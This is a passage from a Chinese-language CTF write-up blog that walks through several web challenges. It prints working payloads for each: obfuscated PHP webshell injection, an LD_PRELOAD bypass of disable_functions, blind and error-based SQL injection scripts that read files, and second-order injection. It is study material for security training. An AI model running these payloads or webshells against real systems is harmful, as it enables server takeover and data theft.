unchange(&quot;flag.php&quot;);?&gt;</span><br></pre></td></tr></table></figure><p><em><strong>得到</strong></em></p><p><em><strong>ZmpdYSZmXGI=</strong></em></p><p><em><strong>不放心，可以放进change函数跑一下，最后拿到flag，这种只有一段源码需要分析的其实相对清晰一些。</strong></em></p><p><em><strong>完整payload：</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?2333=data://text/plain,todat%20is%20a%20happy%20day&amp;file=ZmpdYSZmXGI=</span><br></pre></td></tr></table></figure><p>这里多加%20进行连接，不然会跳400.</p><p><img src="buu3/8.png"></p><h3 id="极客大挑战-2019-RCE-ME"><a href="#极客大挑战-2019-RCE-ME" class="headerlink" title="[极客大挑战 2019]RCE ME"></a>[极客大挑战 2019]RCE ME</h3><p>标题很直接，直接提示rce。无参数攻击。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phperror_reporting(0);if(isset($_GET[&#x27;code&#x27;]))&#123;            $code=$_GET[&#x27;code&#x27;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</span><br></pre></td></tr></table></figure><p>限制传入参数长度小于40，并且把字母数字全部过滤了，</p><p>先看看<a href="https://blog.csdn.net/mochu7777777/article/details/104631142">php代码执行过滤的一些绕过方法</a></p><p>总结的很好，这里我们通过对PHP&gt;=7时，可以直接利用取反构造payload来绕过，先查看一下phpinfo信息。对于rce，我们都可以先通过phpinfo()检测是否有效。</p><p><img src="buu3/9.png"></p><p>这里需要在在线编辑器进行，得到%8F%97%8F%96%91%99%90</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure><p><img src="buu3/9.png"></p><p>看到禁用函数有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">禁用的函数：pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,system,exec,shell_exec,popen,proc_open,passthru,symlink,link,syslog,imap_open,ld,dl</span><br></pre></td></tr></table></figure><p>但是常用assert()函数没被禁，我们可以写入一句话木马，再用蚁剑连接。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php //error_reporting(0);$a=&#x27;assert&#x27;;$b=urlencode(~$a);echo $b;echo &#x27;.................&#x27;;$c=&#x27;(eval($_POST[1]))&#x27;;$d=urlencode(~$c);echo $d;?&gt;</span><br></pre></td></tr></table></figure><p>生成：</p><p><img src="buu3/10.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=(~%9E%8C%8C%9A%8D%8B)(~%D7%9A%89%9E%93%D7%DB%A0%AF%B0%AC%AB%A4%CE%A2%D6%D6);</span><br></pre></td></tr></table></figure><p><img src="buu3/11.png"></p><p>检测shell是可用的，但是蚁剑连不上。第二天一做成功连接，但是flag文件里面内容为空，存在一个readflag。我们需要执行执行这个readflag，但是太多函数被禁用了，绕过这些禁用，我们可以通过使用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE</p><p>参考<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a></p><p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD">EXP</a></p><p>由于在/var/tmp目录有上传权限，我们可以上传禁用函数绕过的文件，上传bypass_disablefun_x64.so和bypass_disablefunc.php（重命名为shell.php）</p><p>这里劫持共享so的具体操作可以参考：<a href="http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/">http://0xcreed.jxustctf.top/2019/10/bypass-disable-functions/</a></p><p><img src="buu3/13.png"></p><p>最后通过异或的方法执行readflag。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=$&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[_]($&#123;%fe%fe%fe%fe^%a1%b9%bb%aa&#125;[__]);&amp;_=assert&amp;__=include(%27/var/tmp/shell.php%27)&amp;cmd=/readflag&amp;outpath=/tmp/tmpfile&amp;sopath=/var/tmp/bypass_disablefunc_x64.so</span><br></pre></td></tr></table></figure><h3 id="WUSTCTF2020-颜值成绩查询"><a href="#WUSTCTF2020-颜值成绩查询" class="headerlink" title="[WUSTCTF2020]颜值成绩查询"></a>[WUSTCTF2020]颜值成绩查询</h3><p>有个查询成绩框，尝试各种sql注入，感觉就只能盲注了。</p><p>这里附上的脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">s=requests.session()</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="string">&#x27;&#123;qwertyuiopasdfghjklzxcvbnm_@#$%^&amp;*()_=-0123456789,./?|&#125;&#x27;</span>:</span><br><span class="line">        url=<span class="string">&quot;http://101.200.53.102:10114/?stunum=if((select(substr(group_concat(value),&#123;&#125;,1))from/**/flag)=&#x27;&#123;&#125;&#x27;,1,2)&quot;</span>.<span class="built_in">format</span>(i,j) </span><br><span class="line">        c = s.get(url ,timeout=<span class="number">3</span>)</span><br><span class="line">        <span class="comment">#print c.text</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;Hi admin&#x27;</span> <span class="keyword">in</span> c.text:</span><br><span class="line">            flag += j</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="BSidesCF-2019-Kookie"><a href="#BSidesCF-2019-Kookie" class="headerlink" title="[BSidesCF 2019]Kookie"></a>[BSidesCF 2019]Kookie</h3><p><img src="buu3/12.png"></p><p>把cookie内容修改成username=admin即可。</p><h3 id="FBCTF2019-RCEService"><a href="#FBCTF2019-RCEService" class="headerlink" title="[FBCTF2019]RCEService"></a>[FBCTF2019]RCEService</h3><p>传入json格式的命令，</p><p>我们传入cmd。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;cmd&quot;:&quot;ls&quot;&#125;</span><br></pre></td></tr></table></figure><p>得到一个index.php文件，尝试读取内容，存在过滤。</p><p>直接看源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>putenv(<span class="string">&#x27;PATH=/home/rceservice/jail&#x27;</span>);<span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;  <span class="variable">$json</span> = <span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>];  <span class="keyword">if</span> (!is_string(<span class="variable">$json</span>)) &#123;    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;  &#125; <span class="keyword">elseif</span> (preg_match(<span class="string">&#x27;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&#x27;</span>, <span class="variable">$json</span>)) &#123;    <span class="keyword">echo</span> <span class="string">&#x27;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&#x27;</span>;  &#125; <span class="keyword">else</span> &#123;    <span class="keyword">echo</span> <span class="string">&#x27;Attempting to run command:&lt;br/&gt;&#x27;</span>;    <span class="variable">$cmd</span> = json_decode(<span class="variable">$json</span>, <span class="literal">true</span>)[<span class="string">&#x27;cmd&#x27;</span>];    <span class="keyword">if</span> (<span class="variable">$cmd</span> !== <span class="literal">NULL</span>) &#123;      system(<span class="variable">$cmd</span>);    &#125; <span class="keyword">else</span> &#123;      <span class="keyword">echo</span> <span class="string">&#x27;Invalid input&#x27;</span>;    &#125;    <span class="keyword">echo</span> <span class="string">&#x27;&lt;br/&gt;&lt;br/&gt;&#x27;</span>;  &#125;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>过滤了很多函数，绕过preg_match()函数，第一种方法：因为preg_match只会去匹配第一行，所以这里可以用多行进行绕过，</p><p>源码中可以看到putenv(‘PATH=/home/rceservice/jail’)已经修改了环境变量，我们只能用绝对路径来调用系统命令</p><p>cat命令在/bin中保存，所以构造payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%0a&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;%0a&#125;</span><br></pre></td></tr></table></figure><p>这里的payload要使用hackbar，不然%0a会被再一次url编码而导致失效。</p><p>方法二：</p><p>使用脚本进行回溯次数绕过</p><p><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">参考</a></p><h3 id="CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="[CISCN2019 总决赛 Day2 Web1]Easyweb"></a>[CISCN2019 总决赛 Day2 Web1]Easyweb</h3><p>fuzz测试，得到源码。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpinclude &quot;config.php&quot;;$id=isset($_GET[&quot;id&quot;])?$_GET[&quot;id&quot;]:&quot;1&quot;;$path=isset($_GET[&quot;path&quot;])?$_GET[&quot;path&quot;]:&quot;&quot;;$id=addslashes($id);$path=addslashes($path);$id=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$id);$path=str_replace(array(&quot;\\0&quot;,&quot;%00&quot;,&quot;\\&#x27;&quot;,&quot;&#x27;&quot;),&quot;&quot;,$path);$result=mysqli_query($con,&quot;select * from images where id=&#x27;&#123;$id&#125;&#x27; or path=&#x27;&#123;$path&#125;&#x27;&quot;);$row=mysqli_fetch_array($result,MYSQLI_ASSOC);$path=&quot;./&quot; . $row[&quot;path&quot;];header(&quot;Content-Type: image/jpeg&quot;);readfile($path);?&gt;</span><br></pre></td></tr></table></figure><p>*<em>这里有个转义函数，为了防止单引号注入，如果传入\0就会变成\\0，同时有个正则替换，这样就变成了只剩一个\*</em></p><p><em><strong>这个反斜杠正好可以转义后面的查询语句中闭合id的单引号的反斜杠，</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#这里直接爆密码，还有类似爆前面的库名表名等等。import requestsurl=&#x27;http://f5dfd7dd-277f-4b79-bfbc-e1021dfd509f.node3.buuoj.cn/image.php?id=\\0&amp;path= or id=&#x27;flag=&#x27;&#x27;for i in range(1,21):min=32;max=125;while 1:j=min+(max+min)/2if min==j:flag+=chr(j)print(flag)breakpayload=&quot;if (ascii(substr((select password from users),&#123;&#125;,1))&lt;&#123;&#125;,1,2)%23&quot;.format(i,j);r=requests.get(url=url+payload).textif len(r)==117007:            max=j        else :            min=j</span><br></pre></td></tr></table></figure><p>爆破得到密码，用户名为admin登陆，存在文件上传。</p><p><img src="buu3/55.png"></p><p>这里会将文件名和用户名写入日志文件，同时这里日志文件为php格式，所以通过文件名进行注入，因为文件名会被写入日志文件中，可以执行php代码。不能上传php文件。对文件名过过滤了，新学了php短标签，将php换成=</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?= @eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><p><img src="buu3/56.png"></p><p><strong>本题关键：反斜杠转义作用，盲注脚本注入，PHP短标签</strong></p><h3 id="Zer0pts2020-Can-you-guess-it"><a href="#Zer0pts2020-Can-you-guess-it" class="headerlink" title="[Zer0pts2020]Can you guess it?"></a>[Zer0pts2020]Can you guess it?</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">include</span> <span class="string">&#x27;config.php&#x27;</span>; <span class="comment">// FLAG is defined in config.phpif (preg_match(&#x27;/config\.php\/*$/i&#x27;, $_SERVER[&#x27;PHP_SELF&#x27;])) &#123;  exit(&quot;I don&#x27;t know what you are thinking, but I won&#x27;t let you read it :)&quot;);&#125;if (isset($_GET[&#x27;source&#x27;])) &#123;  highlight_file(basename($_SERVER[&#x27;PHP_SELF&#x27;]));  exit();&#125;$secret = bin2hex(random_bytes(64));if (isset($_POST[&#x27;guess&#x27;])) &#123;  $guess = (string) $_POST[&#x27;guess&#x27;];  if (hash_equals($secret, $guess)) &#123;    $message = &#x27;Congratulations! The flag is: &#x27; . FLAG;  &#125; else &#123;    $message = &#x27;Wrong.&#x27;;  &#125;&#125;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里通过输入正确答案没法绕过，我们需要从config.php读取flag，config.php被正则过滤了，这里有个<a href="https://www.w3school.com.cn/php/func_filesystem_basename.asp">basename()函数</a>，先看看它的作用。</p><p><img src="buu3/14.png"></p><p><em><strong>$_SERVER[‘PHP_SELF’]返回的是当前正在执行的脚本的名字</strong></em></p><p><em><strong>当我们传入这样的路径，最后就是highlight_file(config.php)，但是被正则替换了，我们要想办法绕过。</strong></em></p><p><em><strong>可以通过一些特殊url编码符号绕过，如%0a,%0b,%0c,%0d,%20等等。</strong></em></p><p><em><strong>我们使用%20,返回的是index.php。</strong></em></p><p><img src="buu3/15.png"></p><p><em><strong>我们加上?source，对config.php，进行访问，换了很多个符合，都无法访问。</strong></em></p><p><img src="buu3/16.png"></p><p>这里肯定跟basename函数一些特性有关系,basename()函数存在一个问题，它会去掉文件名开头的非ASCII值</p><p>ASCII值范围为0-255，但ASCII码并没有规定编号为128~255的字符，ASCII表范围为0-127，也就是我们传入128以上的数值，即可绕过正则，<code>128 -&gt; 0x80</code></p><p>转化成url编码就是%80</p><p><img src="buu3/17.png"></p><p><strong>本题关键：对黑名单绕过结合basename函数漏洞</strong></p><h3 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h3><p><em><strong>发现存在五个php文件，index,search,delete,charge,confirm。怎么感觉又是反序列化。</strong></em></p><p><em><strong>没拿到源码，我们先尝试尝试，search.php能否实现什么查询功能。</strong></em></p><p><em><strong>订单查询只需要输入姓名，电话即可查询地址，看看能不能执行我们传入的代码，只起到打印的作用。</strong></em></p><p><em><strong>还尝试一下有没有ssti注入。</strong></em></p><p><em><strong>看到源码中提示?file=</strong></em></p><p><em><strong>尝试直接读取index.php，不行。</strong></em></p><p><em><strong>通过php伪协议读取成功。</strong></em></p><p><em><strong>index.php</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpini_set(&#x27;open_basedir&#x27;, &#x27;/var/www/html/&#x27;);// $file = $_GET[&quot;file&quot;];$file = (isset($_GET[&#x27;file&#x27;]) ? $_GET[&#x27;file&#x27;] : null);if (isset($file))&#123;    if (preg_match(&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;,$file)) &#123;        echo(&#x27;no way!&#x27;);        exit;    &#125;    @include($file);&#125;?&gt;&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure><p><strong>search.php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phprequire_once &quot;config.php&quot;; if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;         $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row = $fetch-&gt;fetch_assoc();        if(!$row) &#123;            echo &#x27;error&#x27;;            print_r($db-&gt;error);            exit;        &#125;        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#x27;user_name&#x27;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#x27;phone&#x27;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#x27;address&#x27;].&quot;&lt;/p&gt;&quot;;    &#125; else &#123;        $msg = &quot;未找到订单!&quot;;    &#125;&#125;else &#123;    $msg = &quot;信息不全&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure><p><strong>change.php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phprequire_once &quot;config.php&quot;;if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $address = addslashes($_POST[&quot;address&quot;]);    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;        $row = $fetch-&gt;fetch_assoc();        $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];        $result = $db-&gt;query($sql);        if(!$result) &#123;            echo &#x27;error&#x27;;            print_r($db-&gt;error);            exit;        &#125;        $msg = &quot;订单修改成功&quot;;    &#125; else &#123;        $msg = &quot;未找到订单!&quot;;    &#125;&#125;else &#123;    $msg = &quot;信息不全&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure><p><strong>confirm.php</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phprequire_once &quot;config.php&quot;;//var_dump($_POST);if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))&#123;    $msg = &#x27;&#x27;;    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;    $user_name = $_POST[&quot;user_name&quot;];    $address = $_POST[&quot;address&quot;];    $phone = $_POST[&quot;phone&quot;];    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;        $msg = &#x27;no sql inject!&#x27;;    &#125;else&#123;        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;        $fetch = $db-&gt;query($sql);    &#125;    if($fetch-&gt;num_rows&gt;0) &#123;        $msg = $user_name.&quot;已提交订单&quot;;    &#125;else&#123;        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;        $re = $db-&gt;prepare($sql);        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);        $re = $re-&gt;execute();        if(!$re) &#123;            echo &#x27;error&#x27;;            print_r($db-&gt;error);            exit;        &#125;        $msg = &quot;订单提交成功&quot;;    &#125;&#125; else &#123;    $msg = &quot;信息不全&quot;;&#125;?&gt;</span><br></pre></td></tr></table></figure><p><strong>delete.php</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span><span class="keyword">require_once</span> <span class="string">&quot;config.php&quot;</span>;<span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>]))&#123;    <span class="variable">$msg</span> = <span class="string">&#x27;&#x27;</span>;    <span class="variable">$pattern</span> = <span class="string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;    <span class="variable">$user_name</span> = <span class="variable">$_POST</span>[<span class="string">&quot;user_name&quot;</span>];    <span class="variable">$phone</span> = <span class="variable">$_POST</span>[<span class="string">&quot;phone&quot;</span>];    <span class="keyword">if</span> (preg_match(<span class="variable">$pattern</span>,<span class="variable">$user_name</span>) || preg_match(<span class="variable">$pattern</span>,<span class="variable">$phone</span>))&#123;         <span class="variable">$msg</span> = <span class="string">&#x27;no sql inject!&#x27;</span>;    &#125;<span class="keyword">else</span>&#123;        <span class="variable">$sql</span> = <span class="string">&quot;select * from `user` where `user_name`=&#x27;<span class="subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;        <span class="variable">$fetch</span> = <span class="variable">$db</span>-&gt;query(<span class="variable">$sql</span>);    &#125;    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$fetch</span>) &amp;&amp; <span class="variable">$fetch</span>-&gt;num_rows&gt;<span class="number">0</span>)&#123;        <span class="variable">$row</span> = <span class="variable">$fetch</span>-&gt;fetch_assoc();        <span class="variable">$result</span> = <span class="variable">$db</span>-&gt;query(<span class="string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="variable">$row</span>[<span class="string">&quot;user_id&quot;</span>]);        <span class="keyword">if</span>(!<span class="variable">$result</span>) &#123;            <span class="keyword">echo</span> <span class="string">&#x27;error&#x27;</span>;            print_r(<span class="variable">$db</span>-&gt;error);            <span class="keyword">exit</span>;        &#125;        <span class="variable">$msg</span> = <span class="string">&quot;订单删除成功&quot;</span>;    &#125; <span class="keyword">else</span> &#123;        <span class="variable">$msg</span> = <span class="string">&quot;未找到订单!&quot;</span>;    &#125;&#125;<span class="keyword">else</span> &#123;    <span class="variable">$msg</span> = <span class="string">&quot;信息不全&quot;</span>;&#125;<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><em><strong>哈哈哈不是反序列化问题，应该是sql注入。但是过滤了很多函数，仔细看change.php就会发现update存在注入，过滤没有那么严格。</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];</span><br></pre></td></tr></table></figure><p><img src="buu3/18.png"></p><p><em><strong>构造payload读取flag.txt文件。</strong></em></p><p><em><strong>前面修改地址的时候，为了测试sql注入，后面需要改过来，不然会一直报错，因为在执行update前面的旧地址多了一个单引号导致一直报错。</strong></em></p><p><em><strong>payload：</strong></em></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,20)),0x7e),1)#1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),20,60)),0x7e),1)#</span><br></pre></td></tr></table></figure><p><em><strong>两次分别返回部分的flag。</strong></em></p><p><img src="buu3/19.png"></p><p><img src="buu3/20.png"></p><p><em><strong>这里记得第二次要删除订单再第二次报错注入。不然只会返回第一次查询的结果，也是因为会更新的原因，同上。</strong></em></p><h3 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h3><p>登陆，根据提示爆破密码最后三位，是666</p><p>想看看有没有git源码泄露，好像没有。</p><p><img src="buu3/21.png"></p><p>再添加一个config看看，</p><p><img src="buu3/22.png"></p><p>有文件返回，说明存在git源码泄露。</p><p>使用githack，下载一下。好像下不得</p><p><img src="buu3/23.png"></p><p>需要进行恢复一下。</p><p><img src="buu3/24.png"></p><p>还是太菜了，没恢复出来，网上拿一下源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//write_do.php<span class="meta">&lt;?php</span>include &quot;mysql.php&quot;;session_start();if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;    header(&quot;Location: ./login.php&quot;);    die();&#125;if(isset($_GET[&#x27;do&#x27;]))&#123;switch ($_GET[&#x27;do&#x27;])&#123;case &#x27;write&#x27;:    $category = addslashes($_POST[&#x27;category&#x27;]);    $title = addslashes($_POST[&#x27;title&#x27;]);    $content = addslashes($_POST[&#x27;content&#x27;]);    $sql = &quot;insert into board            set category = &#x27;$category&#x27;,                title = &#x27;$title&#x27;,                content = &#x27;$content&#x27;&quot;;    $result = mysql_query($sql);    header(&quot;Location: ./index.php&quot;);    break;case &#x27;comment&#x27;:    $bo_id = addslashes($_POST[&#x27;bo_id&#x27;]);    $sql = &quot;select category from board where id=&#x27;$bo_id&#x27;&quot;;    $result = mysql_query($sql);    $num = mysql_num_rows($result);    if($num&gt;0)&#123;    $category = mysql_fetch_array($result)[&#x27;category&#x27;];    $content = addslashes($_POST[&#x27;content&#x27;]);    $sql = &quot;insert into comment            set category = &#x27;$category&#x27;,                content = &#x27;$content&#x27;,                bo_id = &#x27;$bo_id&#x27;&quot;;    $result = mysql_query($sql);    &#125;    header(&quot;Location: ./comment.php?id=$bo_id&quot;);    break;default:    header(&quot;Location: ./index.php&quot;);&#125;&#125;else&#123;    header(&quot;Location: ./index.php&quot;);&#125;<span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>这里有个函数addslashes，我们在前面sql靶场见过，它看似起到了防护作用，其实导致更容易注入，复习一下。</p><p><a href="https://bbs.ichunqiu.com/thread-10899-1-1.html">addslashes函数绕过技巧</a></p><p>本题为二次注入，在comment部分从数据库中取出的category没有过滤，造成了二次注入。</p><p>通过多行注释符，/**/，最后拼接的结果：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into comment set category = &#x27;1&#x27;,content=user(),/* &#x27;, content = &#x27; */#&#x27;, bo_id = &#x27;$bo_id&#x27;&quot;;</span><br></pre></td></tr></table></figure><p>这里就我们就可以闭合语句，成功注入我们想要的语句。通过content展示我们想要的内容。</p><p>先把</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;,content=user(),/*</span><br></pre></td></tr></table></figure><p>传入category，再把注释符传入content。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*/#</span><br></pre></td></tr></table></figure><p>查看到用户为</p><p><img src="buu3/25.png"></p><p>看到用户为root，如此高的权限，可以尝试使用load_file()读取文件</p><p>payload：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 